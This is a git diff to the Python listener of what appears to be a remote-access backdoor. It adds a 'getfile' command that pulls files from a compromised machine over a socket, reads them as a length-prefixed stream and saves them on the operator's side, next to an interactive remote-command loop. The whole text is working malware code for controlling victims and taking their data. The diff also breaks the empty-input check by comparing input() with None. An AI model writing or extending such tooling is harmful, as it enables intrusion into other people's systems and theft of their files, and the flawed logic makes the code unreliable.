@@ -28,11 +28,25 @@ class StageLisner:
                 Backdoor.settimeout(5)
                 Data = str(Backdoor.recv(4096).decode('latin-1'))
                 print(Data,end='', flush=True)   
-                INPutConnamd = input()
-                if INPutConnamd == '' :
+                InPutCommand = input()
+                if InPutCommand == None :
                     Backdoor.sendall('\n'.encode(('latin-1')))
+                elif 'getfile' in InPutCommand :
+                    Backdoor.sendall(InPutCommand.encode(('latin-1'))) 
+                    Backdoor.recv(1024)                
+                    LenDataFile =  Backdoor.recv(4)
+                    LenDataFile = int.from_bytes(LenDataFile, byteorder='big')
+                    FileDataGet = b''
+                    while len(FileDataGet) < LenDataFile:
+                        BytesBlock =  Backdoor.recv(LenDataFile - len(FileDataGet))
+                        if not BytesBlock:
+                            break
+                        FileDataGet += BytesBlock
+                    with open(InPutCommand.split()[-1], 'wb') as file:
+                        file.write(FileDataGet)
                 else:  
-                    Backdoor.sendall(bytes(INPutConnamd.encode(('latin-1'))))
+
+                    Backdoor.sendall(bytes(InPutCommand.encode(('latin-1'))))
                     Data = str(Backdoor.recv(4096).decode('latin-1'))
                     print(Data,end='', flush=True)
             except TimeoutError : 
